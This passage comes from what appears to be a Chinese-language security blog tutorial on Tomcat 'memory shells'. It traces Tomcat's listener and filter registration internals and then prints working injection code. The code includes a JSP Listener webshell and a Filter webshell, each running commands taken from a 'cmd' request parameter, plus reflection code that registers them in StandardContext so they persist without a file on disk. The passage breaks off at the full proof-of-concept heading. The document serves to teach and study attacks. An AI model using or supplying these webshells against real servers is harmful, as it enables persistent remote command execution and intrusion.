class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public boolean fireRequestInitEvent(ServletRequest request) &#123;</span><br><span class="line"></span><br><span class="line">    Object instances[] = getApplicationEventListeners();</span><br><span class="line"></span><br><span class="line">    if ((instances != null) &amp;&amp; (instances.length &gt; 0)) &#123;</span><br><span class="line"></span><br><span class="line">        ServletRequestEvent event =</span><br><span class="line">                new ServletRequestEvent(getServletContext(), request);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; instances.length; i++) &#123;</span><br><span class="line">            if (instances[i] == null)</span><br><span class="line">                continue;</span><br><span class="line">            if (!(instances[i] instanceof ServletRequestListener))</span><br><span class="line">                continue;</span><br><span class="line">            ServletRequestListener listener =</span><br><span class="line">                (ServletRequestListener) instances[i];</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                listener.requestInitialized(event);</span><br><span class="line">            &#125; catch (Throwable t) &#123;</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                getLogger().error(sm.getString(</span><br><span class="line">                        &quot;standardContext.requestListener.requestInit&quot;,</span><br><span class="line">                        instances[i].getClass().getName()), t);</span><br><span class="line">                request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/./../img/ma/image-20250220175958120.png" alt="image-20250220175958120"></p><p>我们往前跟，看下listener是从哪里来的。直接右键查看声明或用例，在前两行找到了listener的实现，来自于instances[i]，在旁边也显示出listener就是我们创建的Shell_Listener，那就说明至少在这一步或者前一步我们的listener已经被创建了。</p><p><img src="/./../img/ma/image-20250220132821258.png" alt="image-20250220132821258"></p><p>我们继续往前跟，查看instances[i]是怎么产生的。最终定位到这里，显示listener已经存在。</p><p><img src="/./../img/ma/image-20250220132913599.png" alt="image-20250220132913599"></p><p>继续跟进getApplicationEventListeners()</p><p><img src="/./../img/ma/image-20250220180944925.png" alt="image-20250220180944925"></p><p>经过询问AI，这段代码的作用是将存储在<code>applicationEventListenersList</code>集合中的所有事件监听器对象转换为数组，并返回给调用者。那么，意思就是Listener实际上是存储在*<code>applicationEventListenersList</code>*属性中。</p><p>所以我们的下一步就要找到Litener是如何被添加到applicationEventListenersList中的，这里我们直接查找用法，不出意外找到了五处*<code>applicationEventListenersList</code>*被应用的地方。</p><p><img src="/./../img/ma/image-20250220181446039.png" alt="image-20250220181446039"></p><p>根据字面意思，addApplicationEventListener（）是最有可能监听器被添加的地方。不出所料。</p><p><img src="/./../img/ma/image-20250220181636714.png" alt="image-20250220181636714"></p><h4 id="编写Listener内存马"><a href="#编写Listener内存马" class="headerlink" title="编写Listener内存马"></a>编写Listener内存马</h4><p>根据我们在上面的内容，我们可以得出以下结论：</p><p>如果我们想要写一个<code>Listener</code>内存马，需要经过以下步骤：</p><ul><li>继承并编写一个恶意<code>Listener</code></li><li>获取<code>StandardContext</code>上下文</li><li>调用<code>StandardContext.addApplicationEventListener()</code>添加恶意<code>Listener</code></li></ul><p>创建shell.jsp,并写出以下的内存马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    public class Shell_Listener implements ServletRequestListener &#123;</span><br><span class="line"></span><br><span class="line">        public void requestInitialized(ServletRequestEvent sre) &#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            if (cmd != null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; catch (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestDestroyed(ServletRequestEvent sre) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    reqF.setAccessible(true);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext context = (StandardContext) req.getContext();</span><br><span class="line">    Shell_Listener shellListener = new Shell_Listener();</span><br><span class="line">    context.addApplicationEventListener(shellListener);</span><br><span class="line">    out.println(&quot;Inject Listener Memory Shell successfully!&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>访问shell.jsp</p><p><img src="/./../img/ma/image-20250220185002182.png" alt="image-20250220185002182"></p><p>此刻我们的内存马创建成功，访问任意路由即可触发</p><p><img src="/./../img/ma/image-20250220190441787.png" alt="image-20250220190441787"></p><h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><h4 id="编写一个简单的Filter"><a href="#编写一个简单的Filter" class="headerlink" title="编写一个简单的Filter"></a>编写一个简单的Filter</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package com.example.filtershell;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">import static java.lang.System.out;</span><br><span class="line"></span><br><span class="line">public class Test_Filter implements javax.servlet.Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        System.out.println(&quot;Filter initialized&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">            throws IOException, ServletException &#123;</span><br><span class="line">        System.out.println(&quot;Filter processing request&quot;);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        out.println(&quot;Filter destroyed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee</span><br><span class="line">                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;test&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;com.example.filtershell.Test&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;test&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>当我们访问任何路由的时候，控制台继续输出Filter processing request，当我们结束tomcat的时候，会触发destroy方法，从而输出Filter destroyed</p><h4 id="从代码层面分析filter的创建流程"><a href="#从代码层面分析filter的创建流程" class="headerlink" title="从代码层面分析filter的创建流程"></a>从代码层面分析filter的创建流程</h4><p>我们在过滤器进行过滤的地方，也就是doFilter()那里打上断点，观察调用栈。</p><p><img src="/./../img/ma/image-20250219131911755.png" alt="image-20250219131911755"></p><p>我们从上往下跟进，先进入ApplicationFilterChain#internalDoFilter。</p><p><img src="/./../img/ma/image-20250220234934344.png" alt="image-20250220234934344"></p><p>在internalDoFilter函数中通过filter调用了doFilter，而filter是通过filterConfig.getFilter()得到。</p><p><img src="/./../img/ma/image-20250220235614800.png" alt="image-20250220235614800"></p><p>我们注意到filterConfig是ApplicationFilterConfig对象。来自于ApplicationFilterConfig类，那么大概率在前面new了一个ApplicationFilterConfig对象，于是全局搜索关键词new ApplicationFilterConfig,果然如此。</p><p><img src="/./../img/ma/image-20250220235838768.png" alt="image-20250220235838768"></p><p>继续往下跟进调用栈，在ApplicationFilterChain#doFilter调用了ApplicationFilterChain#internalDoFilter</p><p>那么接下来再通过调用栈分析谁调用了ApplicationFilterChain#doFilter，于是来到StandardContextValve类，通过filterChain调用了ApplicationFilterChain#doFilter</p><p><img src="/./../img/ma/image-20250219143248302.png" alt="image-20250219143248302"></p><p>而filterChain来自于ApplicationFilterFactory#createFilterChain</p><p><img src="/./../img/ma/image-20250219143306760.png" alt="image-20250219143306760"></p><p>我们跟进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) &#123;</span><br><span class="line">    if (servlet == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ApplicationFilterChain filterChain = null;</span><br><span class="line">        if (request instanceof Request) &#123;</span><br><span class="line">            Request req = (Request)request;</span><br><span class="line">            if (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                filterChain = new ApplicationFilterChain();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain)req.getFilterChain();</span><br><span class="line">                if (filterChain == null) &#123;</span><br><span class="line">                    filterChain = new ApplicationFilterChain();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            filterChain = new ApplicationFilterChain();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">        StandardContext context = (StandardContext)wrapper.getParent();</span><br><span class="line">        FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">        if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;</span><br><span class="line">            DispatcherType dispatcher = (DispatcherType)request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;);</span><br><span class="line">            String requestPath = null;</span><br><span class="line">            Object attribute = request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;);</span><br><span class="line">            if (attribute != null) &#123;</span><br><span class="line">                requestPath = attribute.toString();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String servletName = wrapper.getName();</span><br><span class="line">            FilterMap[] var10 = filterMaps;</span><br><span class="line">            int var11 = filterMaps.length;</span><br><span class="line"></span><br><span class="line">            int var12;</span><br><span class="line">            FilterMap filterMap;</span><br><span class="line">            ApplicationFilterConfig filterConfig;</span><br><span class="line">            for(var12 = 0; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    if (filterConfig != null) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10 = filterMaps;</span><br><span class="line">            var11 = filterMaps.length;</span><br><span class="line"></span><br><span class="line">            for(var12 = 0; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    if (filterConfig != null) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return filterChain;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return filterChain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从createFilterChain函数中，我们能够清晰地看到filterChain对象的创建过程</p><ol><li><p><strong>创建空的过滤器链</strong><br><code>filterChain = new ApplicationFilterChain()</code><br>→ 初始化一个空的过滤器链容器。</p></li><li><p><strong>获取上下文对象</strong><br><code>StandardContext context = (StandardContext) wrapper.getParent()</code><br>→ 通过 <code>Wrapper</code> 获取其父容器 <code>StandardContext</code>（管理当前Web应用的配置）。</p></li><li><p><strong>提取过滤器映射规则</strong><br><code>FilterMap[] filterMaps = context.findFilterMaps()</code><br>→ 从 <code>StandardContext</code> 中获取所有过滤器的映射规则（URL路径、Servlet名称等）。</p></li><li><p><strong>匹配并获取过滤器配置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 遍历FilterMap，通过名称查找对应的FilterConfig</span><br><span class="line">ApplicationFilterConfig filterConfig = </span><br><span class="line">    (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());</span><br></pre></td></tr></table></figure><p>→ 根据 <code>FilterMap</code> 中的名称，从 <code>StandardContext</code> 中获取具体的过滤器配置。</p></li><li><p><strong>将过滤器加入链中</strong><br><code>filterChain.addFilter(filterConfig)</code><br>→ 将匹配的过滤器按顺序添加到链中，最终形成完整的执行链。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void addFilter(ApplicationFilterConfig filterConfig) &#123;</span><br><span class="line"></span><br><span class="line">        // Prevent the same filter being added multiple times</span><br><span class="line">        for(ApplicationFilterConfig filter:filters)</span><br><span class="line">            if(filter==filterConfig)</span><br><span class="line">                return;</span><br><span class="line"></span><br><span class="line">        if (n == filters.length) &#123;</span><br><span class="line">            ApplicationFilterConfig[] newFilters =</span><br><span class="line">                new ApplicationFilterConfig[n + INCREMENT];</span><br><span class="line">            System.arraycopy(filters, 0, newFilters, 0, n);</span><br><span class="line">            filters = newFilters;</span><br><span class="line">        &#125;</span><br><span class="line">        filters[n++] = filterConfig;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如图示：</p><p>创建 filterChain<br>       ↓<br>获取 StandardContext (wrapper.getParent())<br>       ↓<br>获取 FilterMaps[] (context.findFilterMaps())<br>       ↓<br>遍历 FilterMaps，匹配 URL&#x2F;Servlet ↓<br>       |——匹配成功——→ 获取 FilterConfig (context.findFilterConfig())<br>       |               ↓<br>       |              添加到 filterChain.addFilter()<br>       |<br>       |——匹配失败——→ 跳过<br>       ↓<br>返回 filterChain</p><p><img src="/./../img/ma/image-20250219173026287.png" alt="image-20250219173026287"></p><p>到这里,filter的创建流程我们就梳理完了。所以，我们的核心就是创建一个恶意的Filter添加到FilterConfig中。</p><h4 id="Filter容器与FilterDefs、FilterConfigs、FilterMaps"><a href="#Filter容器与FilterDefs、FilterConfigs、FilterMaps" class="headerlink" title="Filter容器与FilterDefs、FilterConfigs、FilterMaps"></a>Filter容器与FilterDefs、FilterConfigs、FilterMaps</h4><p>FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p><p>FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</p><p>FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</p><p>FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</p><p>跟进ApplicationFilterFactory#createFilterChain的执行流程流程，上下文(StandardContext)包含了FilterDefs、FilterConfigs、FilterMaps。</p><p><img src="/./../img/ma/image-20250221104457879.png" alt="image-20250221104457879"></p><h5 id="FilterMaps"><a href="#FilterMaps" class="headerlink" title="FilterMaps"></a>FilterMaps</h5><p><img src="/./../img/ma/image-20250221105035158.png" alt="image-20250221105035158"></p><p>以array形式存放着过滤器名字和映射路径</p><h5 id="FilterConfigs"><a href="#FilterConfigs" class="headerlink" title="FilterConfigs"></a>FilterConfigs</h5><p><img src="/./../img/ma/image-20250221110026397.png" alt="image-20250221110026397"></p><p>在 FilterConfig 中主要存放 FilterDef 和 Filter对象</p><h5 id="FilterDefs"><a href="#FilterDefs" class="headerlink" title="FilterDefs"></a>FilterDefs</h5><p>以键值对的形式存储filterDef</p><p><img src="/./../img/ma/image-20250221110301557.png" alt="image-20250221110301557"></p><h4 id="编写内存马"><a href="#编写内存马" class="headerlink" title="编写内存马"></a>编写内存马</h4><p>根据我们在上面的分析，我们可以得出以下结论：</p><p>如果我们想要写一个Filter内存马，需要经过以下步骤：</p><ul><li>获取<code>StandardContext</code>；</li><li>编写一个恶意<code>filter</code>；</li><li>实例化一个<code>FilterDef</code>类，包装<code>filter</code>并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个<code>FilterMap</code>类，并将路径和Filtername绑定，添加到filterMaps中；</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ul><h5 id="获取StandardContext"><a href="#获取StandardContext" class="headerlink" title="获取StandardContext"></a>获取StandardContext</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">Field applicationContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">applicationContextField.setAccessible(true);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">standardContextField.setAccessible(true);</span><br><span class="line">StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><h5 id="创建恶意filter"><a href="#创建恶意filter" class="headerlink" title="创建恶意filter"></a>创建恶意filter</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class FilterMemshell implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123; &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        servletResponse.setContentType(&quot;text/html;charset=UTF-8&quot;);</span><br><span class="line">        String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span><br><span class="line">        if (cmd != null) &#123;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;);</span><br><span class="line">            InputStream input = p.getInputStream();</span><br><span class="line">            InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">            BufferedReader br = new BufferedReader(ins);</span><br><span class="line">            servletResponse.getWriter().write(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = br.readLine()) != null) &#123;</span><br><span class="line">                servletResponse.getWriter().write(line);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getWriter().write(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">            br.close();</span><br><span class="line">            ins.close();</span><br><span class="line">            input.close();</span><br><span class="line">            p.getOutputStream().close();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="创建filterdef，并添加到上下文中"><a href="#创建filterdef，并添加到上下文中" class="headerlink" title="创建filterdef，并添加到上下文中"></a>创建filterdef，并添加到上下文中</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FilterDef filterDef = new FilterDef();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilter(filterMemshell);</span><br><span class="line">filterDef.setFilterClass(filterMemshell.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><h5 id="创建-filtermap，并添加到上下文中"><a href="#创建-filtermap，并添加到上下文中" class="headerlink" title="创建 filtermap，并添加到上下文中"></a>创建 filtermap，并添加到上下文中</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FilterMap filterMap = new FilterMap();</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.addURLPattern(&quot;/*&quot;);</span><br></pre></td></tr></table></figure><h5 id="封装filterConfig及filterDef到filterConfigs"><a href="#封装filterConfig及filterDef到filterConfigs" class="headerlink" title="封装filterConfig及filterDef到filterConfigs"></a>封装filterConfig及filterDef到filterConfigs</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">declaredConstructor.setAccessible(true);</span><br><span class="line">ApplicationFilterConfig applicationFilterConfig = declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line">Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">filterConfigsField.setAccessible(true);</span><br><span class="line">Map filterConfigs = (Map) filterConfigsField.get(standardContext);</span><br><span class="line">filterConfigs.put(name, applicationFilterConfig);</span><br><span class="line">response.getWriter().println(&quot;inj success&quot;);</span><br></pre></td></tr></table></figure><h5 id="完整poc"><a href="#完整poc" class="headerlink" title="完整poc"></a>完整poc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 